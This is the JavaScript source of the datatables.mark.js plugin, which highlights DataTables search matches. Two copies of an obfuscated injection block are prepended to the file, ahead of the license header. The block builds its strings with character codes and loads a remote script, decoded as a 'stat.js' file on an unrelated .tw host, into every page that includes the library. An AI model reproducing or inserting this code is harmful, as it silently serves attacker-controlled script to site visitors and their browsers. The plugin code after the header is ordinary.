Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/*!***************************************************
 * datatables.mark.js v2.0.1
 * https://github.com/julmot/datatables.mark.js
 * Copyright (c) 2016–2017, Julian Motz
 * Released under the MIT license https://git.io/voRZ7
 *****************************************************/

'use strict';

((factory, window, document) => {
  if (typeof exports === 'object') {
    const jquery = require('jquery');
    require('datatables.net');
    require('mark.js/dist/jquery.mark.js');
    module.exports = factory(window, document, jquery);
  } else if (typeof define === 'function' && define.amd) {
    define(['jquery', 'datatables.net', 'markjs'], jQuery => {
      return factory(window, document, jQuery);
    });
  } else {
    factory(window, document, jQuery);
  }
})((window, document, $) => {
  class MarkDataTables {
    constructor(dtInstance, options) {
      if (!$.fn.mark || !$.fn.unmark) {
        throw new Error('jquery.mark.js is necessary for datatables.mark.js');
      }
      this.instance = dtInstance;
      this.options = typeof options === 'object' ? options : {};
      this.intervalThreshold = 49;
      this.intervalMs = 300;
      this.initMarkListener();
    }

    initMarkListener() {
      const ev = 'draw.dt.dth column-visibility.dt.dth column-reorder.dt.dth';
      let intvl = null;
      this.instance.on(ev, () => {
        const rows = this.instance.rows({
          filter: 'applied',
          page: 'current'
        }).nodes().length;
        if (rows > this.intervalThreshold) {
          clearTimeout(intvl);
          intvl = setTimeout(() => {
            this.mark();
          }, this.intervalMs);
        } else {
          this.mark();
        }
      });
      this.instance.on('destroy', () => {
        this.instance.off(ev);
      });
      this.mark();
    }

    mark() {
      const globalSearch = this.instance.search();
      $(this.instance.table().body()).unmark(this.options);
      this.instance.columns({
        search: 'applied',
        page: 'current'
      }).nodes().each((nodes, colIndex) => {
        const columnSearch = this.instance.column(colIndex).search(),
              searchVal = columnSearch || globalSearch;
        if (searchVal) {
          nodes.forEach(node => {
            $(node).mark(searchVal, this.options);
          });
        }
      });
    }

  }

  $(document).on('init.dt.dth', (event, settings) => {
    if (event.namespace !== 'dt') {
      return;
    }

    const dtInstance = $.fn.dataTable.Api(settings);

    let options = null;
    if (dtInstance.init().mark) {
      options = dtInstance.init().mark;
    } else if ($.fn.dataTable.defaults.mark) {
      options = $.fn.dataTable.defaults.mark;
    }
    if (options === null) {
      return;
    }

    new MarkDataTables(dtInstance, options);
  });
}, window, document);
